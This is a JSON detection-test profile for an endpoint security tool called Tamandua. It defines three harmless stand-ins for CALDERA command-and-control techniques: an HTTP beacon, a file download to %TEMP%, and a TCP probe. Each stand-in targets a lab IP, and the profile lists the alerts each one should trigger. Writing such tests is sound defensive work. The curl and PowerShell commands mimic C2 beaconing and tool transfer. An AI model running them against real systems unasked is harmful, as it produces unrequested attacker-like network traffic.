{
  "schema_version": 1,
  "profile_id": "windows-caldera-c2-deterministic-equivalent",
  "name": "Windows CALDERA C2 Deterministic Equivalent",
  "description": "Small deterministic equivalents for the CALDERA enterprise C2 beacon chain. Use when CALDERA infrastructure is blocked so Tamandua telemetry, detection, alert and storyline quality can still be validated.",
  "platform": "windows",
  "benchmark_lane": "enterprise-eval",
  "default_observation_seconds": 25,
  "quality_bar": {
    "purpose": "caldera_c2_equivalent",
    "requires_driver_health": false,
    "requires_persisted_events": true,
    "max_unknown_source_events": 0,
    "max_unexpected_high_critical": 0,
    "max_driver_channel_drops": 0,
    "max_driver_kernel_drops": 0
  },
  "tests": [
    {
      "id": "deterministic-caldera-T1071.001-http-beacon",
      "name": "Deterministic HTTP Beacon Safe Equivalent",
      "executor": "command",
      "fallback_command": "cmd.exe /d /c \"curl.exe --max-time 5 -I http://192.168.12.146:8888/beacon & ping -n 2 127.0.0.1 > nul & curl.exe --max-time 5 -I http://192.168.12.146:8888/beacon & exit /b 0\"",
      "expected_telemetry": ["process_create"],
      "optional_telemetry": ["network_connect", "dns_query"],
      "expected_detections": ["c2", "beacon"],
      "expected_alerts": ["c2", "beacon"],
      "expected_correlations": ["network_beacon_sequence"],
      "expected_fields_by_event_type": {
        "process_create": ["agent_id", "hostname", "process_name", "command_line", "path"],
        "network_connect": ["remote_ip"],
        "dns_query": ["domain"]
      },
      "tags": ["caldera-equivalent", "enterprise-safe", "c2", "beacon", "tactic:command-and-control", "mitre:T1071.001"],
      "risk": "medium"
    },
    {
      "id": "deterministic-caldera-T1105-ingress-transfer",
      "name": "Deterministic Ingress Tool Transfer Safe Equivalent",
      "executor": "command",
      "fallback_command": "cmd.exe /d /c \"curl.exe --max-time 5 -sS -o %TEMP%\\tamandua-caldera-t1105.txt http://192.168.12.146:8888/ || echo tamandua-caldera>%TEMP%\\tamandua-caldera-t1105.txt & del /f /q %TEMP%\\tamandua-caldera-t1105.txt & exit /b 0\"",
      "expected_telemetry": ["process_create"],
      "optional_telemetry": ["network_connect", "file_create", "file_delete"],
      "expected_detections": ["download"],
      "expected_alerts": ["c2", "download"],
      "expected_correlations": ["download_execution_sequence"],
      "expected_fields_by_event_type": {
        "process_create": ["agent_id", "hostname", "process_name", "command_line", "path"],
        "network_connect": ["remote_ip"]
      },
      "tags": ["caldera-equivalent", "enterprise-safe", "download", "tactic:command-and-control", "mitre:T1105"],
      "risk": "medium"
    },
    {
      "id": "deterministic-caldera-T1095-tcp-probe",
      "name": "Deterministic TCP Probe Safe Equivalent",
      "executor": "command",
      "fallback_command": "powershell.exe -NoProfile -Command \"$client = New-Object System.Net.Sockets.TcpClient; try { $async = $client.BeginConnect('192.168.12.146', 8888, $null, $null); $async.AsyncWaitHandle.WaitOne(3000) | Out-Null } finally { $client.Close() }; exit 0\"",
      "expected_telemetry": ["process_create"],
      "optional_telemetry": ["network_connect"],
      "expected_detections": ["c2"],
      "expected_alerts": ["c2"],
      "expected_correlations": ["network_process_sequence"],
      "expected_fields_by_event_type": {
        "process_create": ["agent_id", "hostname", "process_name", "command_line", "path"],
        "network_connect": ["remote_ip"]
      },
      "tags": ["caldera-equivalent", "enterprise-safe", "tcp-probe", "tactic:command-and-control", "mitre:T1095"],
      "risk": "medium"
    }
  ]
}
